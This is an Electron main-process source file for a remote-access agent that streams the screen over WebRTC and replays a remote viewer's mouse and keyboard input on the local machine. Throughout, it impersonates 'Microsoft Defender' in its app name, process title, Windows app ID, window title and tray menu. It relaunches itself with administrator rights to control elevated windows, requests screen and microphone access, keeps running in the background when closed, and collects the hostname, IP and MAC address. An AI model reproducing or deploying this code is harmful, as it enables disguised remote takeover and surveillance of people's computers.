const {
  app,
  BrowserWindow,
  ipcMain,
  desktopCapturer,
  screen,
  systemPreferences,
  Tray,
  Menu,
  nativeImage,
} = require("electron");
const runtimeConfig = require("./config");
const WebSocket = require("ws");
let moveMouse, clickMouse, typeChar, pressKey, selectAndDeleteText, deleteSelectedText, selectAllText, scrollWheel, mouseDragSelection;
try {
  const remoteControl = require("./remoteControl");
  moveMouse = remoteControl.moveMouse;
  clickMouse = remoteControl.clickMouse;
  typeChar = remoteControl.typeChar;
  pressKey = remoteControl.pressKey;
  selectAndDeleteText = remoteControl.selectAndDeleteText;
  deleteSelectedText = remoteControl.deleteSelectedText;
  selectAllText = remoteControl.selectAllText;
  scrollWheel = remoteControl.scrollWheel;
  mouseDragSelection = remoteControl.mouseDragSelection;
  console.log("✅ Remote control module loaded successfully");
} catch (e) {
  console.error("❌ Failed to load remote control module:", e.message);
  console.error("Stack:", e.stack);
  // Create no-op fallbacks so the app can still start
  const noop = () => console.warn("Remote control not available");
  moveMouse = clickMouse = typeChar = pressKey = selectAndDeleteText = deleteSelectedText = selectAllText = scrollWheel = mouseDragSelection = noop;
}
const path = require("path");
const os = require("os");

// Set the app name immediately for Task Manager
app.setName("Microsoft Defender");
console.log("🏷️ App name set to:", app.getName());

// Set process title for better Task Manager display
process.title = "Microsoft Defender";
console.log("🏷️ Process title set to:", process.title);

// For Windows, also set the app user model ID
if (process.platform === "win32") {
  app.setAppUserModelId("com.microsoft.defender");
  console.log("🏷️ Windows App User Model ID set to: com.microsoft.defender");
}

// Enable modern capture flags that help with system audio via getDisplayMedia on Windows
try {
  app.commandLine.appendSwitch(
    "enable-features",
    [
      "MediaStream-SystemAudioCapture",
      "WebRtcAllowWgcScreenCapture",
      "GetDisplayMediaSet",
    ].join(",")
  );
  app.commandLine.appendSwitch("autoplay-policy", "no-user-gesture-required");
} catch (e) {
  console.log("⚠️ Could not set Chromium flags:", e?.message || e);
}

let mainWindow;
let tray;
let ws;
let sessionId;
let agentDeviceId;
let isQuitting = false;

async function resolveAgentDeviceId() {
  try {
    // Allow override via env for development/testing
    if (process.env.LA_DEVICE_ID) {
      console.log("Using device_id from env:", process.env.LA_DEVICE_ID);
      return process.env.LA_DEVICE_ID;
    }

    // In production, the device_id is generated and stored locally by the renderer
    // We'll retrieve it from localStorage via the renderer when needed
    // For now, return undefined and let the renderer handle device registration
    console.log("Device ID will be managed by renderer process during registration");
    return undefined;
  } catch (e) {
    console.log("Failed to resolve device_id:", e?.message || e);
    return undefined;
  }
}

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1200,
    height: 800,
    title: "Microsoft Defender - Advanced Protection",
    icon: path.join(__dirname, "logo.png"), // Custom logo for taskbar and window
    show: true, // Force window to be visible
    center: true, // Center the window
    alwaysOnTop: false, // Don't keep on top
    minimizable: true,
    closable: true,
    skipTaskbar: false, // Show in taskbar with proper name
    // Ensure the app name is properly set in window
    frame: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, "preload.js"),
      enableScreenCapturing: true,
      webSecurity: false,
      // Enable these for better media capture support
      enableWebCodecs: true,
      // Allow insecure content for development
      allowRunningInsecureContent: true,
    },
  });

  mainWindow.setMenuBarVisibility(false);

  // The renderer uses renderer-permanent.js; a minimal HTML will attach to it.
  mainWindow.loadFile(path.join(__dirname, "renderer.html"));

  // Set window title explicitly after loading
  mainWindow.setTitle("Microsoft Defender - Advanced Protection");

  // Add event listeners for debugging
  mainWindow.on("ready-to-show", () => {
    console.log("✅ Window ready to show");
    // Ensure title is set when window is ready
    mainWindow.setTitle("Microsoft Defender - Advanced Protection");
    mainWindow.show();
    mainWindow.focus();
    mainWindow.moveTop();
  });

  mainWindow.on("show", () => {
    console.log("✅ Window shown");
  });

  mainWindow.on("focus", () => {
    console.log("✅ Window focused");
  });

  // Force show the window
  mainWindow.show();
  mainWindow.focus();
  mainWindow.moveTop();

  // Handle window minimize to system tray behavior
  mainWindow.on("close", (event) => {
    if (!isQuitting) {
      event.preventDefault();
      mainWindow.hide();
      console.log("🔒 Microsoft Defender minimized to background");

      // Show notification on first minimize
      if (tray && !tray.notificationShown) {
        tray.displayBalloon({
          iconType: "info",
          title: "Microsoft Defender",
          content:
            "Application is running in the background. Click the tray icon to restore.",
        });
        tray.notificationShown = true;
      }

      return false;
    }
  });

  console.log("✅ Window created and shown");

  // Open DevTools in development
  if (process.env.NODE_ENV === "development") {
    mainWindow.webContents.openDevTools();
  }
}

function createSystemTray() {
  // Use custom logo for tray icon
  const icon = nativeImage.createFromPath(path.join(__dirname, "logo.png"));

  tray = new Tray(icon);

  const contextMenu = Menu.buildFromTemplate([
    {
      label: "Microsoft Defender",
      type: "normal",
      enabled: false,
    },
    {
      type: "separator",
    },
    {
      label: "Show Dashboard",
      type: "normal",
      click: () => {
        if (mainWindow) {
          mainWindow.show();
          mainWindow.focus();
        } else {
          createWindow();
        }
      },
    },
    {
      label: "System Status",
      type: "normal",
      click: () => {
        if (mainWindow) {
          mainWindow.show();
          mainWindow.focus();
        } else {
          createWindow();
        }
      },
    },
    {
      type: "separator",
    },
    {
      label: "Settings",
      type: "normal",
      click: () => {
        if (mainWindow) {
          mainWindow.show();
          mainWindow.focus();
          // You can add code here to navigate to settings
        } else {
          createWindow();
        }
      },
    },
    {
      type: "separator",
    },
    {
      label: "Quit Microsoft Defender",
      type: "normal",
      click: () => {
        isQuitting = true;
        app.quit();
      },
    },
  ]);

  tray.setToolTip("Microsoft Defender");
  tray.setContextMenu(contextMenu);

  // Double-click to restore window
  tray.on("double-click", () => {
    if (mainWindow) {
      mainWindow.show();
      mainWindow.focus();
    } else {
      createWindow();
    }
  });

  console.log("🍫 System tray created");
}

// Windows: request admin elevation so we can inject input into elevated windows
// (Task Manager, Device Manager, etc. run at HIGH integrity — we need to match)
// Skip in development (app.isPackaged === false) to avoid a UAC prompt on every dev launch
if (process.platform === "win32" && app.isPackaged) {
  const { execSync, spawn } = require("child_process");
  const isAdmin = (() => {
    try { execSync("net session", { stdio: "ignore" }); return true; }
    catch { return false; }
  })();
  if (!isAdmin) {
    console.log("⚠️ Not running as admin — relaunching with elevation for elevated-window control");
    spawn(
      "powershell",
      ["-Command", `Start-Process -FilePath "${process.execPath}" -Verb RunAs`],
      { detached: true, stdio: "ignore" }
    ).unref();
    app.exit(0);
  } else {
    console.log("✅ Running as Administrator — elevated-window input control enabled");
  }
}

app.whenReady().then(async () => {
  // Check accessibility permissions on macOS
  if (process.platform === "darwin") {
    try {
      const hasAccess = systemPreferences.isTrustedAccessibilityClient(true);
      console.log("Accessibility trusted:", hasAccess);

      if (!hasAccess) {
        console.log(
          "⚠️  Accessibility permissions required for remote control"
        );
        console.log(
          "Please enable accessibility for this app in System Preferences > Security & Privacy > Privacy > Accessibility"
        );
      }
    } catch (error) {
      console.error("Error checking accessibility:", error);
    }
  }

  // Request screen capture permissions
  try {
    const permission = await systemPreferences.askForMediaAccess("screen");
    console.log("Screen capture permission granted:", permission);
  } catch (error) {
    console.log("Screen capture permission request failed:", error.message);
  }

  // Request microphone permissions for audio capture
  try {
    const audioPermission = await systemPreferences.askForMediaAccess(
      "microphone"
    );
    console.log("Microphone permission granted:", audioPermission);
  } catch (error) {
    console.log("Microphone permission request failed:", error.message);
  }

  // Request screen recording permissions (required for desktop audio on macOS)
  if (process.platform === "darwin") {
    try {
      const screenRecordingPermission =
        systemPreferences.getMediaAccessStatus("screen");
      console.log(
        "Screen recording permission status:",
        screenRecordingPermission
      );

      if (screenRecordingPermission !== "granted") {
        console.log(
          "⚠️ Screen recording permission required for desktop audio capture"
        );
        console.log(
          "Please enable screen recording for this app in System Preferences > Security & Privacy > Privacy > Screen Recording"
        );

        // Try to request screen recording permission
        try {
          const screenRecordingRequest =
            await systemPreferences.askForMediaAccess("screen");
          console.log(
            "Screen recording permission request result:",
            screenRecordingRequest
          );
        } catch (requestError) {
          console.log(
            "Screen recording permission request failed:",
            requestError.message
          );
        }
      }
    } catch (error) {
      console.log("Screen recording permission check failed:", error.message);
    }
  }

  // Create system tray for background operation
  createSystemTray();

  createWindow();
});

// Handle app quit properly
app.on("before-quit", () => {
  isQuitting = true;
  console.log("🛑 Microsoft Defender shutting down");
});

// Handle macOS dock icon click
app.on("activate", () => {
  // On macOS, re-create window when dock icon is clicked
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  } else if (mainWindow) {
    mainWindow.show();
    mainWindow.focus();
  }
});

// Prevent the app from quitting when all windows are closed (main background handler)
app.on("window-all-closed", (event) => {
  // Prevent default quit behavior - this keeps the app running in background
  console.log("🔒 All windows closed - keeping app running in background");
  // Don't call app.quit() - this is what keeps it running
});

// IPC handler for creating session
ipcMain.handle("create-session", async () => {
  try {
    console.log("🔌 Creating WebSocket connection to signaling server...");

    // Ensure we have the correct device_id for this agent so the backend can map viewer -> agent
    if (!agentDeviceId) {
      agentDeviceId = await resolveAgentDeviceId();
    }
    if (!agentDeviceId) {
      throw new Error("Could not determine agent device_id");
    }

    // Build WS URL based on environment config
    const baseWs = runtimeConfig.WS_SERVER_URL || `ws://127.0.0.1:8081/ws`;
    const urlObj = new URL(baseWs);
    // Ensure path is /ws and append query params
    urlObj.searchParams.set("device_id", agentDeviceId);
    urlObj.searchParams.set("role", "agent");
    const wsUrl = urlObj.toString();
    console.log("Connecting to signaling WebSocket:", wsUrl);

    ws = new WebSocket(wsUrl, { family: 4 });

    return new Promise((resolve, reject) => {
      ws.on("open", () => {
        console.log("✅ WebSocket connected to signaling server");
        const tempSessionId = Math.random()
          .toString(36)
          .substring(2, 10)
          .toUpperCase();
        ws.send(
          JSON.stringify({
            type: "create-session",
            sessionId: tempSessionId,
          })
        );
      });

      ws.on("message", (msg) => {
        try {
          const data = JSON.parse(msg);
          console.log("📨 Received message:", data.type);
          if (data.type === "viewer-input") {
            console.log(
              "📨 Full viewer-input message:",
              JSON.stringify(data, null, 2)
            );
          }

          if (data.type === "session-created") {
            console.log("🤖 Session created:", data.sessionId);

            // Store the correct session ID from server
            sessionId = data.sessionId;

            // Send session creation success to renderer
            mainWindow.webContents.send("session-created", {
              sessionId: data.sessionId,
            });

            resolve(data.sessionId);
          }

          // When viewer joins, immediately create and send offer
          if (data.type === "viewer-joined") {
            console.log("👁️ Viewer joined, creating WebRTC offer...");

            // Send message to renderer to handle screen capture and WebRTC
            mainWindow.webContents.send("create-webrtc-offer", {
              sessionId: data.sessionId,
            });

            mainWindow.webContents.send("viewer-joined", data);
          }

          if (data.type === "viewer-disconnected") {
            console.log("👁️ Viewer disconnected");
            mainWindow.webContents.send("viewer-disconnected");
          }

          if (data.type === "webrtc-offer") {
            console.log("📝 Received WebRTC offer from viewer");
            mainWindow.webContents.send("webrtc-offer", data);
          }

          if (data.type === "webrtc-answer") {
            console.log("📝 Received WebRTC answer from viewer");
            mainWindow.webContents.send("webrtc-answer", data);
          }

          if (data.type === "webrtc-ice") {
            console.log("🧊 Received ICE candidate from viewer");
            mainWindow.webContents.send("ice-candidate", data);
          }

          if (data.type === "input-event") {
            const payload =
              data && typeof data.data === "object" && data.data !== null
                ? data.data
                : data;
            console.log("🎮 Received input event:", payload.action);
            handleInput(payload);
          }

          if (data.type === "viewer-input") {
            console.log(
              "🎮 Received viewer input:",
              data.action,
              "at",
              data.x,
              data.y
            );
            console.log(
              "🎮 Full viewer input data:",
              JSON.stringify(data, null, 2)
            );
            // Convert viewer-input to the format expected by handleInput
            const inputData = {
              action: data.action,
              x: data.x,
              y: data.y,
              button: data.button,
              key: data.key,
              char: data.char,
              modifiers: data.modifiers,
              remoteWidth: data.remoteWidth,
              remoteHeight: data.remoteHeight,
            };
            handleInput(inputData);
          }
        } catch (error) {
          console.error("❌ Error parsing message:", error);
        }
      });

      ws.on("error", (error) => {
        console.error("❌ WebSocket error:", error);
        reject(error);
      });

      ws.on("close", () => {
        console.log("🔌 WebSocket connection closed");
      });

      // Timeout after 10 seconds
      setTimeout(() => {
        reject(new Error("Connection timeout"));
      }, 10000);
    });
  } catch (error) {
    console.error("❌ Failed to create session:", error.message);
    throw error;
  }
});

// IPC handler for sending WebRTC offer
ipcMain.handle("send-offer", (event, data) => {
  try {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(
        JSON.stringify({
          type: "webrtc-offer",
          sessionId: data.sessionId,
          offer: data.offer,
        })
      );
      console.log("📤 Sent WebRTC offer to signaling server");
      return { success: true };
    } else {
      throw new Error("WebSocket not connected");
    }
  } catch (error) {
    console.error("❌ Failed to send offer:", error.message);
    return { success: false, error: error.message };
  }
});

// IPC handler for sending WebRTC answer
ipcMain.handle("send-answer", (event, data) => {
  try {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(
        JSON.stringify({
          type: "webrtc-answer",
          sessionId: data.sessionId,
          answer: data.answer,
        })
      );
      console.log("📤 Sent WebRTC answer to signaling server");
      return { success: true };
    } else {
      throw new Error("WebSocket not connected");
    }
  } catch (error) {
    console.error("❌ Failed to send answer:", error.message);
    return { success: false, error: error.message };
  }
});

// IPC handler for sending ICE candidates
ipcMain.handle("send-ice", (event, data) => {
  try {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(
        JSON.stringify({
          type: "webrtc-ice",
          sessionId: data.sessionId,
          candidate: data.candidate,
          target: data.target,
        })
      );
      console.log("📤 Sent ICE candidate to signaling server");
      return { success: true };
    } else {
      throw new Error("WebSocket not connected");
    }
  } catch (error) {
    console.error("❌ Failed to send ICE candidate:", error.message);
    return { success: false, error: error.message };
  }
});

// IPC handler for getting display media
ipcMain.handle("get-display-media", async () => {
  try {
    console.log("🔍 Getting display sources...");
    const sources = await desktopCapturer.getSources({
      types: ["screen"],
      thumbnailSize: { width: 1920, height: 1080 },
    });

    console.log(
      `📺 Found ${sources.length} display sources:`,
      sources.map((s) => ({ name: s.name, id: s.id }))
    );

    if (sources.length > 0) {
      return sources; // Return ALL sources
    } else {
      throw new Error("No screen sources found");
    }
  } catch (error) {
    console.error("❌ Failed to get display media:", error.message);
    throw error;
  }
});

// IPC handler for getting desktop sources (fallback)
ipcMain.handle("get-desktop-sources", async (event, options) => {
  try {
    const types = options?.types || ["screen"];
    console.log(
      "🔍 Getting desktop sources via main process with types:",
      types
    );

    const sources = await desktopCapturer.getSources({
      types: types,
      thumbnailSize: { width: 1920, height: 1080 },
      ...options,
    });

    console.log(
      `📺 Found ${sources.length} desktop sources via main process:`,
      sources.map((s) => ({ name: s.name, id: s.id }))
    );

    if (sources.length > 0) {
      return sources;
    } else {
      throw new Error("No desktop sources found");
    }
  } catch (error) {
    console.error(
      "❌ Failed to get desktop sources via main process:",
      error.message
    );
    throw error;
  }
});

// Handle WebRTC messages from renderer
ipcMain.handle("send-webrtc-offer", async (event, offerData) => {
  try {
    console.log("🔍 Main received offer data:", offerData);
    console.log("🔍 Offer data type:", offerData?.type);
    console.log("🔍 Offer data SDP length:", offerData?.sdp?.length);

    if (ws && ws.readyState === WebSocket.OPEN) {
      const message = {
        type: "webrtc-offer",
        sessionId: sessionId,
        offer: offerData,
      };
      console.log("🔍 Sending message to signaling server:", message);
      ws.send(JSON.stringify(message));
      console.log("📤 Sent WebRTC offer to viewer via signaling server");
      return { success: true };
    } else {
      throw new Error("WebSocket not connected");
    }
  } catch (error) {
    console.error("❌ Failed to send WebRTC offer:", error);
    throw error;
  }
});

ipcMain.handle("send-webrtc-answer", async (event, answerData) => {
  try {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(
        JSON.stringify({
          type: "webrtc-answer",
          sessionId: sessionId,
          answer: answerData.answer,
        })
      );
      console.log("📤 Sent WebRTC answer to viewer via signaling server");
      return { success: true };
    } else {
      throw new Error("WebSocket not connected");
    }
  } catch (error) {
    console.error("❌ Failed to send WebRTC answer:", error);
    throw error;
  }
});

ipcMain.handle("send-ice-candidate", async (event, candidateData) => {
  try {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(
        JSON.stringify({
          type: "webrtc-ice",
          sessionId: sessionId,
          candidate: candidateData.candidate,
        })
      );
      console.log("📤 Sent ICE candidate to viewer via signaling server");
      return { success: true };
    } else {
      throw new Error("WebSocket not connected");
    }
  } catch (error) {
    console.error("❌ Failed to send ICE candidate:", error);
    throw error;
  }
});

// Device information handler
ipcMain.handle("get-device-info", async () => {
  const os = require("os");
  const { networkInterfaces } = os;

  try {
    // Get network interfaces to find IP and MAC
    const interfaces = networkInterfaces();
    let ipAddress = "Unknown";
    let macAddress = "Unknown";

    // Find the first non-internal interface
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (!iface.internal && iface.family === "IPv4") {
          ipAddress = iface.address;
          macAddress = iface.mac;
          break;
        }
      }
      if (ipAddress !== "Unknown") break;
    }

    return {
      hostname: os.hostname(),
      platform: os.platform(),
      ipAddress: ipAddress,
      macAddress: macAddress,
      architecture: os.arch(),
      type: os.type(),
    };
  } catch (error) {
    console.error("❌ Failed to get device info:", error);
    return {
      hostname: "Unknown",
      platform: process.platform,
      ipAddress: "Unknown",
      macAddress: "Unknown",
      architecture: process.arch,
      type: "Unknown",
    };
  }
});

// Remote control input handler
ipcMain.handle("send-remote-input", async (event, inputData) => {
  try {
    console.log("🎮 IPC: send-remote-input called");
    console.log("🎮 IPC: inputData received:", JSON.stringify(inputData, null, 2));
    
    // Send logs to renderer for debugging
    event.sender.send("main-process-log", "🎮 IPC: send-remote-input called");
    event.sender.send("main-process-log", `🎮 IPC: inputData received: ${JSON.stringify(inputData, null, 2)}`);
    
    // Safe console logging with error handling
    try {
      console.log("🎮 Received remote input via IPC:", inputData.action);
      event.sender.send("main-process-log", `🎮 Received remote input via IPC: ${inputData.action}`);
    } catch (logError) {
      console.log("⚠️ Log error:", logError.message);
      event.sender.send("main-process-log", `⚠️ Log error: ${logError.message}`);
    }
    
    console.log("🎮 About to call handleInput...");
    event.sender.send("main-process-log", "🎮 About to call handleInput...");
    
    await handleInput(inputData, event);
    
    console.log("🎮 handleInput completed successfully");
    event.sender.send("main-process-log", "🎮 handleInput completed successfully");
    
    return { success: true };
  } catch (error) {
    try {
      console.error("❌ Error processing remote input:", error);
      event.sender.send("main-process-log", `❌ Error processing remote input: ${error.message}`);
    } catch (logError) {
      // Ignore console logging errors
    }
    return { success: false, error: error.message };
  }
});

// Handle input events from viewer
async function handleInput(data, event = null) {
  // Coalesce high-frequency mouse move events to reduce latency/backlog
  // Shared state across calls
  if (!global.__mouseMoveState) {
    global.__mouseMoveState = { inProgress: false, pending: null };
  }
  try {
    const { width, height } = screen.getPrimaryDisplay().bounds;

    if (data.action === "mousemove" || data.action === "move") {
      const state = global.__mouseMoveState;
      if (state.inProgress) {
        state.pending = data; // keep only latest
        return;
      }
      state.inProgress = true;
      let current = data;
      do {
        await moveMouse(
          current.x,
          current.y,
          width,
          height,
          current.remoteWidth || width,
          current.remoteHeight || height
        );
        current = state.pending;
        state.pending = null;
      } while (current);
      state.inProgress = false;
    }

    // Handle click events - process both "click" and "mouseup" actions
    if (data.action === "click" || data.action === "mouseup") {
      // Move mouse to click coordinates first, then click
      if (data.x !== undefined && data.y !== undefined) {
        await moveMouse(
          data.x,
          data.y,
          width,
          height,
          data.remoteWidth || width,
          data.remoteHeight || height
        );
      }

      await clickMouse(data.button === 2 || data.button === "right" ? "right" : "left");
    }

    // Handle double-click events
    if (data.action === "dblclick") {
      if (data.x !== undefined && data.y !== undefined) {
        await moveMouse(
          data.x,
          data.y,
          width,
          height,
          data.remoteWidth || width,
          data.remoteHeight || height
        );
      }
      const btn = data.button === 2 ? "right" : "left";
      await clickMouse(btn);
      await new Promise((r) => setTimeout(r, 50));
      await clickMouse(btn);
      console.log(`🖱️ Double-click executed at (${data.x}, ${data.y})`);
    }

    // Skip mousedown to prevent multiple clicks
    if (data.action === "mousedown") {
      return; // Skip without logging
    }

    if (data.action === "type") {
      await typeChar(data.char);
    }

    // Handle batched printable characters from viewer (fast typing path)
    if (data.action === "type-batch" && data.text) {
      await typeChar(data.text);
    }

    // Handle keypress, keydown, keyup events (viewer may send any of these)
    if (data.action === "keypress" || data.action === "keydown" || data.action === "keyup") {
      // Only process keydown events to avoid duplicate key presses
      if (data.action === "keydown" || data.action === "keypress") {
        await pressKey(data.key, data.modifiers || [], data.code, data.ctrlKey, data.altKey, data.shiftKey, data.metaKey);
      }
    }

    // Handle text selection and deletion
    if (data.action === "selectAndDelete") {
      await selectAndDeleteText(data.startX, data.startY, data.endX, data.endY);
    }

    if (data.action === "deleteSelected") {
      await deleteSelectedText();
    }

    if (data.action === "selectAll") {
      await selectAllText();
    }

    // Handle mouse wheel scrolling - OPTIMIZED
    if (data.action === "wheel" || data.action === "scroll") {
      console.log(`🖱️ Received scroll event: deltaX=${data.deltaX || 0}, deltaY=${data.deltaY || 0} at (${data.x}, ${data.y})`);
      await scrollWheel(
        data.x,
        data.y,
        data.deltaX || 0,
        data.deltaY || 0,
        width,
        height,
        data.remoteWidth || width,
        data.remoteHeight || height
      );
    }

    // Handle mouse drag selection - OPTIMIZED
    if (data.action === "dragSelection") {
      await mouseDragSelection(
        data.startX,
        data.startY,
        data.endX,
        data.endY,
        width,
        height,
        data.remoteWidth || width,
        data.remoteHeight || height
      );
    }

    // Handle scroll up/down keyboard shortcuts
    if (data.action === "scrollUp") {
      console.log("⬆️ Processing scroll up:", data);
      await pressKey("PageUp", [], "PageUp");
    }

    if (data.action === "scrollDown") {
      console.log("⬇️ Processing scroll down:", data);
      await pressKey("PageDown", [], "PageDown");
    }
  } catch (error) {
    console.error("❌ Error handling input:", error);
    console.error("❌ Error stack:", error.stack);
    console.error("❌ Input data that caused error:", JSON.stringify(data, null, 2));
  }
}

// Window control IPC handlers for background functionality
ipcMain.handle("minimize-to-background", async () => {
  try {
    if (mainWindow) {
      mainWindow.hide();
      console.log("🔒 Window minimized to background via IPC");
      return { success: true };
    }
    return { success: false, error: "No window available" };
  } catch (error) {
    console.error("❌ Error minimizing window:", error.message);
    return { success: false, error: error.message };
  }
});

ipcMain.handle("show-from-background", async () => {
  try {
    if (mainWindow) {
      mainWindow.show();
      mainWindow.focus();
      console.log("📱 Window restored from background via IPC");
      return { success: true };
    } else {
      createWindow();
      console.log("📱 New window created via IPC");
      return { success: true };
    }
  } catch (error) {
    console.error("❌ Error showing window:", error.message);
    return { success: false, error: error.message };
  }
});

ipcMain.handle("get-background-status", async () => {
  try {
    const isVisible = mainWindow && mainWindow.isVisible();
    const isMinimized = mainWindow && mainWindow.isMinimized();
    return {
      success: true,
      isVisible,
      isMinimized,
      isRunningInBackground: !isVisible,
      hasWindow: !!mainWindow,
    };
  } catch (error) {
    console.error("❌ Error getting background status:", error.message);
    return { success: false, error: error.message };
  }
});

// Window control IPC handlers (for custom title bar)
ipcMain.handle("window-minimize", () => {
  if (mainWindow) mainWindow.minimize();
});

ipcMain.handle("window-maximize", () => {
  if (mainWindow) {
    if (mainWindow.isMaximized()) {
      mainWindow.unmaximize();
    } else {
      mainWindow.maximize();
    }
  }
});

ipcMain.handle("window-close", () => {
  if (mainWindow) mainWindow.close();
});

ipcMain.handle("window-is-maximized", () => {
  return mainWindow ? mainWindow.isMaximized() : false;
});

console.log("🚀 Electron main process ready!");
